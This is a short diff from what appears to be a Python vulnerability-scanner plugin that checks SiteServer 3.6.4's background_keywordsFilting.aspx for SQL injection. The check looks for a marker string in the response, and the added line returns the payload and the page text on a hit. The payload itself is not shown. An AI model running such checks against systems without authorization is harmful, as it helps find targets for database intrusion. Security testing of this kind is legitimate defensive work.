@@ -25,6 +25,7 @@ class siteserver_background_keywordsFilting_sqli_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 cprint("[+]存在siteserver3.6.4 background_keywordsFilting.aspx注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "siteserver3.6.4 background_keywordsFilting.aspx注入", str(payload), req.text
             else:
                 cprint("[-]不存在siteserver_background_keywordsFilting_sqli漏洞", "white", "on_grey")
                 return False, None, None, None, None
